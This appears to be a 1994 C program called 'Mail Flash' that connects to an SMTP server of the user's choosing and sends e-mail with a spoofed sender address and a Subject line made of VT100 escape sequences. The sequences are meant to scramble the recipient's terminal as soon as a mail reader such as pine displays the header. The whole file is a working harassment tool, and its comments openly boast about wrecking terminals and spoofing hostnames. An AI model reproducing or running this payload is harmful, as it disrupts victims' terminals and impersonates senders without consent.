/*

  Mail Flash - (C) 1994 CHA0S All Rights Reserved
  
  This is a simple program which demonstrates the problem with certain
  parts of VT100 emulation.  Previously similar programs made use
  of talkd, but a user could stop attempts by simply entering
  "mesg n".  This program sends the "flash" string which will really
  screw over a terminal in the SUBJECT header of e-mail.  E-Mail readers
  such as pine show you this before you can decide to even delete the mail!
  
  Support has been added to choose your own SMTP server for neat-o hostname
  spoofing.  (krad!)
  
*/  

#include <stdio.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdarg.h>

#define bcopy(x, y, z) memmove(y, x, z)
#define bzero(y, z) memset(y, 0, z)
 
void smtp_connect(char *server);
 
int thesock; /* the socket */
 
void smtp_connect(char *server)
{
  struct sockaddr_in sin;
  struct hostent *hp;
  
  hp = gethostbyname(server);
  if (hp==NULL) {
    printf("Unknown host: %s\n",server);
    exit(0);
  }
  bzero((char*) &sin, sizeof(sin));
  bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
  sin.sin_family = hp->h_addrtype;
  sin.sin_port = htons(25);
  thesock = socket(AF_INET, SOCK_STREAM, 0);
  connect(thesock,(struct sockaddr *) &sin, sizeof(sin));
}
 
void main(int argc, char **argv)
{
  char buf[1024];
  
  if (argc != 4) {
    printf("usage: mflash smtp_server from to\n");
    exit(0);
  }
  printf("Connecting to SMTP Server %s\n",argv[1]);
  smtp_connect(argv[1]);
  printf("Sending Mail Flash To %s\n",argv[3]);
  sprintf(buf, "helo a\nmail from: %s\nrcpt to: %s\ndata\nSUBJECT: \033c\033(0\033#8\033[1;3r\033[J\033[5m\033[?5h\n.\nquit\n",argv[2],argv[3]);
  send(thesock, buf, strlen(buf), 0);
  /* I am not sure how to check when this buffer is done being sent.
     If you are having any problems increase the sleep time below! */
  printf("Sleeping To Make Sure Data Is Sent ...\n");
  sleep(3);
  printf("Done!\n");
}
